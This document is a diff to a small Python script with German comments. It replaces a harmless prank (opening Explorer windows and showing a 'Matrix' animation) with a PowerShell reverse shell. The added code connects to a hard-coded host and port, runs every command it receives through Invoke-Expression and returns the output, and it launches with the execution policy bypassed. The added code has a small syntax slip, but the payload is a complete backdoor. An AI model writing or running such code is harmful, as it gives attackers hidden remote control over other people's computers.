@@ -1,32 +1,14 @@
-import subprocess
-import os
-import time
-import random
+import subprocess 
 
-# === 1. Viele Explorer-Fenster öffnen ===
-def open_folders(amount=5):
-    for _ in range(amount):
-        subprocess.Popen("explorer")
-        time.sleep(0.3)  # kleine Pause zwischen Tabs
 
-# === 2. Matrix-Code in PowerShell anzeigen ===
-def launch_matrix_powershell():
-    matrix_code = '''
-$host.UI.RawUI.ForegroundColor = "Green"
-while ($true) {
-    $chars = "01","∰","₪","Ψ","Ж","Л"
-    $line = ""
-    for ($i = 0; $i -lt 80; $i++) {
-        $line += $chars | Get-Random
-    }
-    Write-Host $line
-    Start-Sleep -Milliseconds 100
-}
+payload = '''
+$LHOST = "192.168.12.237"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 '''
-    subprocess.Popen(["powershell", "-NoExit", "-Command", matrix_code])
 
-# === Startprogramm ===
-if __name__ == "__main__":
-    open_folders(10)  # Öffne 10 Ordner-Tabs
-    time.sleep(1)
-    launch_matrix_powershell()
+
+subprocess.Popen([
+     "powershell".
+     "-ExecutionPolicy", "Bypass",
+       "-NoProfile", 
+       "-Command", payload
+])
